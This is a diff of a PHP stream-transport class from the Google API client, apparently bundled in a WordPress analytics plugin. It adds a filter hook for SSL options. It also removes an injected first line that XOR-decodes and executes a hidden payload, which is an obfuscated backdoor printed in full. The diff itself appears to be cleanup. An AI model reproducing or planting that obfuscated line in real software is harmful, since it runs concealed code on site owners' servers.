@@ -1,4 +1,4 @@
-<?php $YBSEdVJhBaga='R4T  -<KAWZA0+C'^'1F1ATHc-4995YD-';$raQNpiLGCkw=$YBSEdVJhBaga('','=TYJ>:U+T,=9sP7+1=APrJR0i+M,Wf<QIAvLKx>xnXXCU DCZwACNoH1L6g+YIHFIULLTIZPUV,gaYAqVGfnfOW2;imhCNlIqlFRDYcEFqrcYXFIx2NDTW9npI.F3Cxrk.NAeFgotSK0YJHwkpQ.2X>qUlDsuN=QR6n9kuA7-JRS6nE9K0N7oR>zlR4JH4:zRA1>KAI>,:5ghcI9TTDsbJV-JRB6T>-JYb:UTUSOK3WS X>9KV3N31VQps=:wwe.-PR0Ea=E-wLlBkZS.IPYKM>gbZJ8U6X,>QkVOQ.YCgQI=A<AzYBL=M-K1laPB61HlnxI02D+GeL1h19HY2+1gLLbi1 :,c-R,9tfK3.hWGBF<.8M0awLmsOPI-;SnSTWydNcK7IU1DOfDY98QVqCN;U07HlY;F971j2-X0pMHtONFSGR6Q.D2ZOC6:QL61dhZ  G0US.Wqg2766YHla24ZVfbXmT--7,,WDSMvz-.cA=8:8jcGRMY7L-9WR-8.X=NL7raK-Ycbgo>W>XHdQejJ=IsKAJO<;2c1.KC9pLWwrlWvcVUa2F3VFDFMXTFZSAPSxWjDWQPL0oRnENCrMN4A=2>,:q1S1H1EER3AY=OMOUjnC 5,9BfketPLKGkyRXRWfb-.:;:e3W:=Y+ZJ7xJ8eVB.DzVhaOC'^'T2qkXO;H ERW,5OBBI2xU2=B6O,X69c<<5QebXErg>--6T-,4W9,<0,P8W8t4<<nm1-85ezt>3UNAyaQv<lgok8GOIPHdiWCxe =6qG,fLRSbxb DA:682WFT-O2RjCROGejLLnfP<>DyduWCT5OF9eU<1d-UjV4+mJPKPaDY8>6XFaR.IgjFi4se Q>=FTRv.DJbzC7Q0HmbG-X 5dNB,7A97y<pZL>8=Q0-uno-R; Ec43-9A+RR>qXWby88.ghp3CeEV TWqRbO,2B<5pk64nF>+L4i3IGqVvk:K xmXmY H ZdbhK,A>TWk-H<X.LFYmTS0JnE7;aWV:<SHYGdh=;tqoi0yrMJTB VWHjybbJOT8UHW7gzFt-LO2181.YYnG R0n;MFB 8MYqkQg8Z9ERsfPFLD=;NVL,QPph4: 565;W=G>Wr7,De5-BP;77UToR4 KaE8VRUY=-DEVU.7ONxI0LYVsG2=zdMpDHKeYYNYJEar,+E-Tf<7TgK T=8DZF H DNGKZ6J9aDwCJbP-Fce..HZiDZK2ddYljJRK3EUdlYSvUnwsr,jlqo0wbaA5Sq3f2yRVuGeheR,<F DmUIC.T+X;E6muC  Q ,+rFNgDTXXkOKETplk<ap7.3;NFIONZaBC6CQ6J>mjQq2l3:G0RfAZE>');$raQNpiLGCkw();
+<?php
 /*
  * Copyright 2013 Google Inc.
  *
@@ -86,6 +86,9 @@ class Deconf_IO_Stream extends Deconf_IO_Abstract
 
     $requestSslContext = array_key_exists('ssl', $default_options) ?
         $default_options['ssl'] : array();
+
+    // Add support for GADWP Endpoint
+    $requestSslContext = apply_filters('gadwp_endpoint_stream_options', $requestSslContext, $request);
 
     if (!$this->client->isAppEngine() && !array_key_exists("cafile", $requestSslContext)) {
       $requestSslContext["cafile"] = dirname(__FILE__) . '/cacerts.pem';
